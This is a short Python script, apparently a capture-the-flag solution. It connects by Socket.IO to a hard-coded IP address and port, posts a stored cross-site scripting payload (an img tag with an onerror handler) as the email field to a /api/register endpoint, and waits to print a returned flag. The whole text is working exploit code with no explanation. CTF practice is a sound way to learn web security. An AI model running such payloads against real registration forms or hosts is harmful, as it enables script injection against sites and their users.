import socketio
import requests

HOST = '94.237.49.212:44715'
sio = socketio.Client()

@sio.event
def connect():
    print('Connected to server')

@sio.on('flag')
def on_flag(data):
    print('Received flag:', data['flag'])
    sio.disconnect()

def main():
    sio.connect(f'http://{HOST}')
    
    xss_payload = '<img src="#" onerror="alert(0)"'
    resp = requests.post(f'http://{HOST}/api/register', json={'email': xss_payload})
    
    sio.wait() # keep the connection alive

if __name__ == '__main__':
    main()
